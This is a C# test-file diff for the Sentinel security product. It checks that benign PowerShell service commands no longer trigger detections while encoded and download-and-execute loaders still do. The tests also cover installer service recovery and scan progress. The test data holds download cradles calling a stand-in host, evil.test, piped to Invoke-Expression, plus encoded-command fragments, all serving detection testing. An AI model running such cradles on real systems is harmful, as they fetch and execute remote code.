@@ -4,6 +4,7 @@ using Sentinel.Core.Audit.Process;
 using Sentinel.Core.Auditors.Memory;
 using Sentinel.Core.Behavioral;
 using Sentinel.Core.Detection;
+using Sentinel.Core.Ipc;
 using Sentinel.Core.Kernel;
 using Sentinel.Core.Monitoring;
 using Sentinel.Core.Protection;
@@ -445,5 +446,152 @@ public class AskUserSeverityTests
         var resolved = await b.Dispatcher.ResolveAsync(pending.Id, Realtime.ThreatDecision.Quarantine);
         Assert.Equal(Realtime.ThreatStatus.Terminated, resolved.Status);
         Assert.Contains(9700, b.Host.Killed);
+    }
+}
+
+/// <summary>
+/// Ложные срабатывания 1.3.0 на Katana: служебные команды powershell/cmd с -ExecutionPolicy Bypass, Invoke-Expression и
+/// -Encoding UTF8 давали BH-02 + PROC-CMD-IEX (High). Настоящие загрузчики (download cradle, -EncodedCommand) ловятся по-прежнему.
+/// </summary>
+public class ScriptHostFalsePositiveTests
+{
+    [Theory]
+    [InlineData(@"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ""Get-Content a.txt -Encoding UTF8 | Out-File b.txt -Encoding utf8""")]
+    [InlineData(@"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ""$cmd = 'Get-Date'; Invoke-Expression $cmd""")]
+    [InlineData(@"cmd.exe /d /s /c ""powershell -NoProfile -Command ""& { iex $env:SCRIPT }""""")]
+    [InlineData(@"powershell.exe -e")]
+    public void ServiceStyleCommands_AreNotWeaponized(string commandLine)
+    {
+        var engine = new BehavioralCorrelationEngine();
+        Assert.Null(engine.ReportProcessStart(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", commandLine, true));
+    }
+
+    [Theory]
+    [InlineData(@"powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0A")]
+    [InlineData(@"powershell -e SQBFAFgAIAAoAE4AZQB3AC0A")]
+    [InlineData(@"powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0A")]
+    [InlineData(@"powershell -c ""iwr https://evil.test/a.ps1 -UseBasicParsing | iex""")]
+    [InlineData(@"powershell -c ""irm https://evil.test/a.ps1 | Invoke-Expression""")]
+    [InlineData(@"powershell -c ""IEX (New-Object Net.WebClient).DownloadString('http://evil.test/a')""")]
+    [InlineData(@"powershell -c ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p))""")]
+    public void RealLoaders_AreStillWeaponized(string commandLine)
+    {
+        var engine = new BehavioralCorrelationEngine();
+        Assert.Equal(CorrelationChain.WeaponizedArtifact,
+            engine.ReportProcessStart(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", commandLine, true)!.Chain);
+    }
+
+    [Fact]
+    public void LoneIex_IsMedium_CradleIsHigh_BypassIsLow()
+    {
+        var lone = InterpreterHeuristics.Analyze("powershell.exe", @"powershell -ExecutionPolicy Bypass -Command ""Invoke-Expression $cmd""");
+        Assert.Equal(Severity.Medium, Assert.Single(lone, f => f.Id == "PROC-CMD-IEX").Severity);
+        Assert.Equal(Severity.Low, Assert.Single(lone, f => f.Id == "PROC-PS-BYPASS").Severity);
+
+        var cradle = InterpreterHeuristics.Analyze("powershell.exe", @"powershell -c ""iwr https://evil.test/a.ps1 | iex""");
+        Assert.Equal(Severity.High, Assert.Single(cradle, f => f.Id == "PROC-CMD-IEX").Severity);
+    }
+
+    [Fact]
+    public void SignedSystemInterpreter_WithLoneIex_IsLogOnly()
+    {
+        // Максимум находок — Medium (60 баллов); доверенная подпись Microsoft снимает 35 → ниже порога «спросить».
+        var verdict = new FalsePositiveGuard().Evaluate(new GuardContext
+        {
+            Path = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            Score = 60,
+            HasValidTrustedSignature = true,
+        });
+
+        Assert.Equal(GuardDecision.LogOnly, verdict.Decision);
+    }
+
+    [Fact]
+    public async Task ProcessEvent_ShowsCommandLine()
+    {
+        using var b = new DispatcherBench();
+        var entry = new ProcessAuditEntry(
+            new ProcessSnapshot { Pid = 9800, Name = "powershell.exe", ExecutablePath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                CommandLine = @"powershell -c ""iwr https://evil.test/a.ps1 | iex""" },
+            [AuditFinding.Create("PROC-CMD-IEX", Severity.High, "IEX", "Синтетика.")],
+            null);
+
+        var threat = await b.Dispatcher.DispatchProcessForDecisionAsync(entry, "проверка");
+
+        Assert.Contains(@"Команда: powershell -c ""iwr https://evil.test/a.ps1 | iex""", threat!.Description, StringComparison.Ordinal);
+    }
+}
+
+/// <summary>1.3.1: MSI не должен падать с 1939/1603 на настройке восстановления службы.</summary>
+public class InstallerPackageTests
+{
+    private static string Repo => Path.GetDirectoryName(RepoPaths.RulesDirectory)!;
+
+    [Fact]
+    public void Package_DoesNotUseMsiServiceConfigFailureActions()
+    {
+        var wxs = File.ReadAllText(Path.Combine(Repo, "installer", "Sentinel.Installer", "Package.wxs"));
+
+        Assert.DoesNotContain("<ServiceConfigFailureActions", wxs, StringComparison.Ordinal);
+        Assert.DoesNotContain("<ServiceConfig ", wxs, StringComparison.Ordinal);
+        Assert.Contains("Name=\"SentinelService\"", wxs, StringComparison.Ordinal);
+    }
+
+    [Fact]
+    public void Service_ConfiguresItsOwnRecoveryPolicy()
+    {
+        var source = File.ReadAllText(Path.Combine(Repo, "src", "Sentinel.Service", "ServiceRecovery.cs"));
+        var program = File.ReadAllText(Path.Combine(Repo, "src", "Sentinel.Service", "Program.cs"));
+
+        Assert.Contains("SERVICE_START", source, StringComparison.Ordinal);            // право, без которого MSI получал ACCESS_DENIED
+        Assert.Contains("SERVICE_CONFIG_FAILURE_ACTIONS", source, StringComparison.Ordinal);
+        Assert.Contains("AddHostedService<ServiceRecoveryWorker>", program, StringComparison.Ordinal);
+    }
+}
+
+/// <summary>Полная/быстрая проверка: прогресс по этапам, без «зависания» на 95 % во время аудита автозагрузки.</summary>
+public class ScanProgressPhaseTests
+{
+    [Fact]
+    public async Task LongPersistenceAudit_ReportsElapsedTime_AndStaysWithinItsPhase()
+    {
+        await using var bench = new RuntimeBench { PersistenceDelay = TimeSpan.FromSeconds(2.5) };
+        for (var i = 0; i < 5; i++)
+        {
+            bench.Host.Add(5000 + i, 1, $"app{i}.exe", $@"C:\Apps\app{i}.exe");
+        }
+
+        bench.Drop("a.txt", "hello"u8.ToArray());
+
+        var final = await bench.ScanAsync(new ScanRequest(ScanMode.Quick));
+
+        Assert.Equal(ScanState.Completed, final.State);
+        List<ScanProgress> progress;
+        lock (bench.Progress)
+        {
+            progress = [.. bench.Progress];
+        }
+
+        var persistence = progress.Where(p => p.Stage == "Автозагрузка и реестр").ToList();
+        Assert.Contains(persistence, p => p.CurrentItem.Contains("идёт аудит", StringComparison.Ordinal));
+        Assert.All(persistence, p => Assert.InRange(p.Percent, 4, 12));
+        Assert.All(progress.Where(p => p.Stage == "Процессы"), p => Assert.InRange(p.Percent, 0, 4));
+        Assert.All(progress.Where(p => p.Stage == "Файлы" && p.State == ScanState.Running), p => Assert.InRange(p.Percent, 15, 99.9));
+    }
+
+    [Fact]
+    public async Task FreshServiceAudit_IsReused_InsteadOfSecondLongAudit()
+    {
+        await using var bench = new RuntimeBench();
+        await bench.Runtime.AuditPersistenceAndConfigAsync();
+        Assert.Equal(1, bench.PersistenceAudits);
+
+        await bench.ScanAsync(new ScanRequest(ScanMode.Quick));
+
+        Assert.Equal(1, bench.PersistenceAudits);
+        lock (bench.Progress)
+        {
+            Assert.Contains(bench.Progress, p => p.CurrentItem.Contains("результат фонового аудита службы", StringComparison.Ordinal));
+        }
     }
 }
